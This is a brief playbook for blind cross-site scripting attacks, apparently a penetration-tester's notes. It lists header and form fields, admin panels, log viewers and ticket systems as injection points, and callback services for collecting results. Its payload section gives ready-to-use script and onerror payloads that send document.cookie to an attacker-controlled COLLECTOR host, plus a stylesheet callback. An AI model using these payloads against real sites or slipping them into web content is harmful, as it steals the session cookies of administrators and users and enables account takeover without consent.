# Blind XSS Playbook

## Setup
- xss.report account: use your collector ID
- Or interactsh: interactsh-client
- Replace COLLECTOR with your callback URL

## Injection points
- User agent, Referer, X-Forwarded-For headers
- Contact forms, feedback forms
- Log viewers, admin panels
- PDF generators
- Email previews
- Error logs
- Support ticket systems

## Payloads
Use blind-xss.txt payloads with COLLECTOR replaced:
- <script>fetch('https://COLLECTOR?c='+document.cookie)</script>
- <img src=x onerror=fetch('https://COLLECTOR?c='+document.cookie)>
- <link rel=stylesheet href=https://COLLECTOR>

## Verification
- Check xss.report dashboard for callbacks
- Check interactsh for DNS/HTTP interactions
